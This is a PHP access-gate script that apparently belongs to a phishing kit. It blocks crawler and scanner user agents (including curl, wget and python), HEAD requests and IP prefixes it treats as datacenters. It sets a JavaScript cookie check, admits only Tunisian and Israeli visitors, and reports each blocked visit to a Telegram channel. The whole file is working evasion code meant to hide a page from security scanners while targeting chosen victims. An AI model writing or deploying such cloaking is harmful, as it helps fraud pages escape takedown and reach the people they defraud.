<?php
include_once("config.php");

// === Block user agents ===
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$bad_agents = ['bot','crawl','spider','scanner','curl','wget','python','httpx','go-http','libwww'];
foreach ($bad_agents as $agent) {
  if (strpos($ua, $agent) !== false) {
    tg_send("❌ <b>Blocked bot UA:</b>\nIP: {$_SERVER['REMOTE_ADDR']}\nUA: $ua");
    http_response_code(403);
    exit;
  }
}

// === Block HEAD requests ===
if ($_SERVER['REQUEST_METHOD'] === 'HEAD') {
  http_response_code(403);
  exit;
}

// === Block common hosting IP ranges ===
$ip = $_SERVER['REMOTE_ADDR'];
$blocks = ['66.','67.','69.','91.','185.','192.','198.','199.','203.','209.','216.'];
foreach ($blocks as $b) {
  if (strpos($ip, $b) === 0) {
    tg_send("❌ <b>Blocked datacenter IP:</b> $ip");
    http_response_code(403);
    exit;
  }
}

// === Basic JavaScript check (cookie)
if (!isset($_COOKIE['verified'])) {
  echo "<script>document.cookie='verified=1;path=/';location.reload();</script>";
  exit;
}

// === Country filter (TN + IL only)
if (function_exists('geoip_country_code_by_name')) {
  $cc = geoip_country_code_by_name($ip);
  if (!in_array($cc, ['TN', 'IL'])) {
    tg_send("❌ <b>Blocked foreign IP:</b>\nIP: $ip\nCountry: $cc");
    http_response_code(403);
    exit;
  }
}
?>
